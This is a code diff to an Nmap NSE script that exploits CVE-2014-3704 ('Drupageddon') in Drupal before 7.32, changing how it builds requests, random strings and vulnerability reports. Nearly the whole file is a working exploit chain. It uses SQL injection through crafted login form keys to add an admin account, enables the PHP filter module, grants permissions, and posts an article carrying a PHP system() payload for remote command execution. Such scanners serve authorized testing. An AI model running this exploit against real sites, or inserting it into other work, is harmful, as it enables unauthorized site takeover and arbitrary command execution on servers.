@@ -1,4 +1,3 @@
-local bit = require "bit"
 local http = require "http"
 local shortport = require "shortport"
 local stdnse = require "stdnse"
@@ -6,8 +5,8 @@ local string = require "string"
 local table = require "table"
 local url = require "url"
 local vulns = require "vulns"
-local re = require "re"
 local openssl = require "openssl"
+local rand = require "rand"
 
 description = [[
 Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32
@@ -31,6 +30,8 @@ Exploitation technique used to achieve RCE on the target is based on exploit/mul
 ]]
 
 ---
+-- @see http-sql-injection.nse
+--
 -- @usage
 -- nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" <target>
 -- nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false <target>
@@ -130,12 +131,12 @@ local function phpass_encode64(input)
   while cur < count do
     local value = string.byte(input, cur)
     cur = cur + 1
-    table.insert(out, itoa64(bit.band(value, 0x3f)))
+    table.insert(out, itoa64(value & 0x3f))
 
     if cur < count then
-      value = bit.bor(value, bit.lshift(string.byte(input, cur), 8))
+      value = value | (string.byte(input, cur) << 8)
     end
-    table.insert(out, itoa64(bit.band(bit.rshift(value, 6), 0x3f)))
+    table.insert(out, itoa64((value >> 6) & 0x3f))
 
     if cur >= count then
       break
@@ -143,16 +144,16 @@ local function phpass_encode64(input)
     cur = cur + 1
 
     if cur < count then
-      value = bit.bor(value, bit.lshift(string.byte(input, cur), 16))
+      value = value | (string.byte(input, cur) << 16)
     end
-    table.insert(out, itoa64(bit.band(bit.rshift(value, 12), 0x3f)))
+    table.insert(out, itoa64((value >> 12) & 0x3f))
 
     if cur >= count then
       break
     end
     cur = cur + 1
 
-    table.insert(out, itoa64(bit.band(bit.rshift(value, 18), 0x3f)))
+    table.insert(out, itoa64((value >> 18) & 0x3f))
   end
 
   return table.concat(out)
@@ -162,7 +163,7 @@ local function gen_passwd_hash(passwd)
   local iter = 15
   local iter_char = itoa64(iter)
   local iter_count = 1<<iter
-  local salt = stdnse.generate_random_string(8)
+  local salt = rand.random_alpha(8)
 
   local md5 = openssl.md5(salt .. passwd)
   for i = 1, iter_count do
@@ -185,10 +186,10 @@ local function do_sql_query(host, port, uri, user)
   local query
 
   if user == nil then
-    user = stdnse.generate_random_string(10)
-    passwd = stdnse.generate_random_string(10)
+    user = rand.random_alpha(10)
+    passwd = rand.random_alpha(10)
     passHash = gen_passwd_hash(passwd)
-    email = stdnse.generate_random_string(8) .. '@' .. stdnse.generate_random_string(5) .. '.' .. stdnse.generate_random_string(3)
+    email = rand.random_alpha(8) .. '@' .. rand.random_alpha(5) .. '.' .. rand.random_alpha(3)
 
     stdnse.debug(1, string.format("adding admin user (username: '%s'; passwd: '%s')", user, passwd))
     sql_user = url.escape("insert into users (uid,name,pass,mail,status) select max(uid)+1,'" .. user .. "','" .. passHash .. "','" .. email .. "',1 from users;")
@@ -206,17 +207,19 @@ local function do_sql_query(host, port, uri, user)
     query = sql_admin .. sql_user
   end
 
-  local r = "name[0;" .. query .. "#%20%20]=" .. stdnse.generate_random_string(10) .. "&name[0]=" .. stdnse.generate_random_string(10) .. "&pass=" .. stdnse.generate_random_string(10) .. "&form_id=user_login&op=Log+in"
+  local r = "name[0;" .. query .. "#%20%20]=" .. rand.random_alpha(10) .. "&name[0]=" .. rand.random_alpha(10) .. "&pass=" .. rand.random_alpha(10) .. "&form_id=user_login&op=Log+in"
 
   local opt = {
     header = {
       ['Content-Type'] = "application/x-www-form-urlencoded"
     }
   }
-  local res = http.post(host, port, uri .. "/user/login", opt, nil, r)
-  --TODO: Check return status
+  local res = http.post(host, port, uri .. "?q=/user/login", opt, nil, r)
 
-  return user, passwd
+  if string.match(res.body, "includes[\\/]database[\\/]database%.inc") and string.match(res.body, "addcslashes%(%)") then
+    return user, passwd
+  end
+
 end
 
 local function set_php_filter(host, port, uri, session, disable)
@@ -231,7 +234,7 @@ local function set_php_filter(host, port, uri, session, disable)
   local opt = {}
   opt['cookies'] = session.name ..'='.. session.value
 
-  local res = http.get(host, port, uri .. "/admin/modules", opt)
+  local res = http.get(host, port, uri .. "?q=/admin/modules", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -251,7 +254,7 @@ local function set_php_filter(host, port, uri, session, disable)
   data['form_token'] = csrfToken
   data['form_id'] = 'system_modules'
   data['op'] = 'Save configuration'
-  res = http.post(host, port, uri .. "/admin/modules/list/confirm", opt, nil, data)
+  res = http.post(host, port, uri .. "?q=/admin/modules/list/confirm", opt, nil, data)
   if res == nil then return nil end
 
   return true
@@ -269,7 +272,7 @@ local function set_permission(host, port, uri, session, disable)
   local opt = {}
   opt['cookies'] = session.name ..'='.. session.value
 
-  local res = http.get(host, port, uri .. "/admin/people/permissions", opt)
+  local res = http.get(host, port, uri .. "?q=/admin/people/permissions", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
@@ -289,7 +292,7 @@ local function set_permission(host, port, uri, session, disable)
   data['form_token'] = csrfToken
   data['form_id'] = 'user_admin_permissions'
   data['op'] = 'Save permissions'
-  res = http.post(host, port, uri .. "/admin/people/permissions", opt, nil, data)
+  res = http.post(host, port, uri .. "?q=/admin/people/permissions", opt, nil, data)
   if res == nil then return nil end
 
   return true
@@ -303,15 +306,15 @@ local function trigger_exploit(host, port, uri, session, cmd)
   -- add new Content page & trigger RCE
   stdnse.debug(1, string.format("%s", "creating new article page with planted payload"))
 
-  local res = http.get(host, port, uri .. "/node/add/article", opt)
+  local res = http.get(host, port, uri .. "?q=/node/add/article", opt)
   if res == nil then return nil end
 
   local csrfToken = extract_CSRFtoken(res.body)
 
   stdnse.debug(1, string.format("%s", "calling preview article page & triggering exploit"))
-  local pattern = '"' .. stdnse.generate_random_string(5)
+  local pattern = '"' .. rand.random_alpha(5)
   local payload = "<?php echo '" .. pattern .. " '; system('" .. cmd .. "'); echo '".. pattern .. " '; ?>"
-  local boundary = stdnse.generate_random_string(16)
+  local boundary = rand.random_alpha(16)
   opt['header'] = {}
   opt['header']["Content-Type"] = "multipart/form-data" .. "; boundary=" .. boundary
 
@@ -325,7 +328,7 @@ local function trigger_exploit(host, port, uri, session, cmd)
   }
   local body = multipart_build_body(files, boundary)
 
-  res = http.post(host, port, uri .. "/node/add/article", opt, nil, body)
+  res = http.post(host, port, uri .. "?q=/node/add/article", opt, nil, body)
   if res == nil then return nil end
 
   return res.body, pattern
@@ -340,9 +343,37 @@ action = function(host, port)
     cleanup = "false"
   end
 
+  local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
+  local vuln = {
+    title = 'Drupal - pre Auth SQL Injection Vulnerability',
+    state = vulns.STATE.NOT_VULN,
+    description = [[
+  The expandArguments function in the database abstraction API in
+  Drupal core 7.x before 7.32 does not properly construct prepared
+  statements, which allows remote attackers to conduct SQL injection
+  attacks via an array containing crafted keys.
+    ]],
+    IDS = {CVE = 'CVE-2014-3704'},
+    references = {
+      'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
+      'https://www.drupal.org/SA-CORE-2014-005',
+      'http://www.securityfocus.com/bid/70595',
+    },
+    dates = {
+      disclosure = {year = '2014', month = '10', day = '15'},
+    },
+  }
+
   local user, passwd = do_sql_query(host, port, uri, nil)
 
+  if user == nil or passwd == nil then
+    return vulnReport:make_output(vuln)
+  end
+
   stdnse.debug(1, string.format("logging in as admin user (username: '%s'; passwd: '%s')", user, passwd))
+
+  vuln.state = vulns.STATE.EXPLOIT
+
   local data = {
     ['name'] = user,
     ['pass'] = passwd,
@@ -350,31 +381,11 @@ action = function(host, port)
     ['op'] = 'Log in',
   }
 
-  local res = http.post(host, port, uri .. "/user/login", nil, nil, data)
+  local res = http.post(host, port, uri .. "?q=/user/login", nil, nil, data)
 
   if res.status == 302 and res.cookies[1].name ~= nil then
-    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
-    local vuln = {
-      title = 'Drupal - pre Auth SQL Injection Vulnerability',
-      state = vulns.STATE.NOT_VULN,
-      description = [[
-The expandArguments function in the database abstraction API in
-Drupal core 7.x before 7.32 does not properly construct prepared
-statements, which allows remote attackers to conduct SQL injection
-attacks via an array containing crafted keys.
-      ]],
-      IDS = {CVE = 'CVE-2014-3704'},
-      references = {
-        'https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html',
-        'https://www.drupal.org/SA-CORE-2014-005',
-        'http://www.securityfocus.com/bid/70595',
-      },
-      dates = {
-        disclosure = {year = '2014', month = '10', day = '15'},
-      },
-    }
+
     stdnse.debug(1, string.format("logged in as admin user (username: '%s'; passwd: '%s'). Target is vulnerable.", user, passwd))
-    vuln.state = vulns.STATE.EXPLOIT
 
     if cmd ~= nil then
       local session = {}
@@ -404,11 +415,16 @@ attacks via an array containing crafted keys.
       end
     end
 
-    -- cleanup: remove admin user
-    if cleanup == nil then
-      do_sql_query(host, port, uri, user)
-    end
-
-    return vulnReport:make_output(vuln)
+  else
+    vuln.state = vulns.STATE.LIKELY_VULN
+    vuln.check_results = "Account created but unable to log in."
   end
+
+  -- cleanup: remove admin user
+  if cleanup == nil then
+    do_sql_query(host, port, uri, user)
+  end
+
+  return vulnReport:make_output(vuln)
+
 end
